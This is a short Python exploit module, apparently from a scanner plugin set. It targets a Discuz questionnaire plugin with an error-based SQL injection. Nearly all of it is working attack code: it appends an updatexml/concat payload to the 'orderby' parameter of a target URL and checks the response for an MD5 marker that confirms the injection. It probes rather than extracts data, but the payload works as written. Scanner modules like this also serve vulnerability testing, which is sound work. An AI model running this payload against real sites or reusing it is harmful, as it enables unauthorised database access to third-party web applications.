# coding:utf-
# _PlugName_ = Discuz问卷调查专业版插件注入
# _Refer_ = http://0day5.com/archives/3188
import requests

class Exploit:

    def attack(self, url):
        payload = "/plugin.php?id=nds_up_ques:nds_ques_viewanswer&srchtxt=1&orderby=dateline%20and%201=(updatexml(1,concat(0x27,MD5(1)),1))--"
        verify_url = url + payload

        response = requests.get(verify_url)

        if response.status_code == 200 and "c4ca4238a0b923820dcc509a6f75849" in response.text:
            return "{} has SQL Injection".format(verify_url)